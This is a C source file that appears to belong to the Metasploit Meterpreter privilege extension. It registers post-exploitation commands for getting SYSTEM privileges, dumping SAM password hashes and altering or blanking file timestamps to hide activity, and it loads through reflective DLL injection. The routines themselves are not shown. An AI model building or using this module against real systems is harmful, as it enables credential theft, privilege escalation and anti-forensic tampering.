/*
 * This module implements privilege escalation features. 
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../../ReflectiveDLLInjection/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

//#include "../../../ReflectiveDLLInjection/ReflectiveLoader.c"
Command customCommands[] =
{

	// Elevate
	{ "priv_elevate_getsystem",
	  { elevate_getsystem,							      { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Priv
	{ "priv_passwd_get_sam_hashes",
	  { request_passwd_get_sam_hashes,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Fs
	{ "priv_fs_get_file_mace",
	  { request_fs_get_file_mace,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "priv_fs_set_file_mace",
	  { request_fs_set_file_mace,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "priv_fs_set_file_mace_from_file",
	  { request_fs_set_file_mace_from_file,                { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "priv_fs_blank_file_mace",
	  { request_fs_blank_file_mace,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "priv_fs_blank_directory_mace",
	  { request_fs_blank_directory_mace,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
